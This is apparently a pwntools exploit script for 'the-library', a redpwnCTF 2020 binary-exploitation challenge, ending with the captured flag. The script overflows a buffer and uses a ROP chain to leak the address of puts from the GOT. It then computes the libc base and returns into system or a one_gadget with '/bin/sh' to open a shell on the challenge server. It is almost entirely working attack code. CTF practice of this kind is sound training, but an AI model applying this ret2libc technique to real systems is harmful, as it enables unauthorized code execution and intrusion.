from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./the-library')
	raw_input('debug')
	puts_offset = 0x06f690
	system_offset = 0x4526a 
	binsh_offset = 0x18cd57
else:
	host, port = '2020.redpwnc.tf', 31350
	r = remote(host, port)
	libc = ELF('./libc.so.6')
	puts_offset = libc.symbols['puts']
	system_offset = 0x4f322
	binsh_offset = next(libc.search('/bin/sh'))

main_add = 0x400637
rop_rdi = 0x0000000000400733 
puts_plt = 0x400520
puts_got = 0x601018

buf = 'a'*20 + 'bbbb' + p64(rop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add) 
r.sendlineafter(' your name?', buf)

r.recvuntil('bbbb')
res = r.recv(3)
log.info(res)
r.recv(1)
res = r.recv(6) + '\x00\x00'
puts_add = u64(res)
log.info("puts_add = %#x" %puts_add)

libc_base = puts_add - puts_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset
log.info("libc add = %#x " %libc_base)
log.info(puts_offset)
buf2 = 'a'*20 + 'bbbb' + p64(rop_rdi) + p64(binsh_add) + p64(system_add) + p64(main_add) 
buf2 += '\x00'*0x40
r.sendlineafter(' your name?', buf2)

r.interactive()
r.close()

# flag{jump_1nt0_th3_l1brary}

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
  # rsp & 0xf == 0
  # rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
  # [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
  # [rsp+0x70] == NULL